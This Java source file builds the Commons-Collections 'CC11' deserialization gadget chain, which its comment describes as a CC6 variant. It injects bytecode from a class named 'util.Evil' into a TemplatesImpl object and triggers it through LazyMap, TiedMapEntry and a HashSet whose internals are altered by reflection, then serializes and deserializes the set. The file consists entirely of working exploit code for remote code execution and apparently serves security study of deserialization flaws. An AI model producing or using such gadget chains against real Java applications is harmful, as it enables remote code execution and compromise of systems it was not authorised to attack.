package vuln;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import util.SerializeUtil;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
/**
 * cc11为cc6的变种
 * **/
public class Commoncollections11 {
    public static void main(String[] args) throws NotFoundException, IOException, CannotCompileException, NoSuchFieldException, ClassNotFoundException, IllegalAccessException {
        vulncc11();
    }
    public static void vulncc11() throws NotFoundException, IOException, CannotCompileException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        CtClass evil_payload = ClassPool.getDefault().get("util.Evil");
        TemplatesImpl templates = new TemplatesImpl();
        SerializeUtil.setFieldValue(templates,"_name","v1f18");
        SerializeUtil.setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        SerializeUtil.setFieldValue(templates,"_bytecodes",new byte[][]{evil_payload.toBytecode()});


        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        });

        Map decorate = LazyMap.decorate(new HashMap(), chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, templates);
        HashSet hashSet = new HashSet();
        hashSet.add(1);
        Field f,f2 ;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        //hashset实际上使用hashmap来存储,hashsetMap就是hashmap类
        HashMap hashsetMap = (HashMap) f.get(hashSet);

        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }
        f2.setAccessible(true);
        Object[] array = (Object[])f2.get(hashsetMap);
        Object node = array[0];
        if (node == null){
            node = array[1];
        }
        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node,tiedMapEntry);

        SerializeUtil.readObjectToByteArray(SerializeUtil.writeObjectToByteArray(hashSet));

    }
}
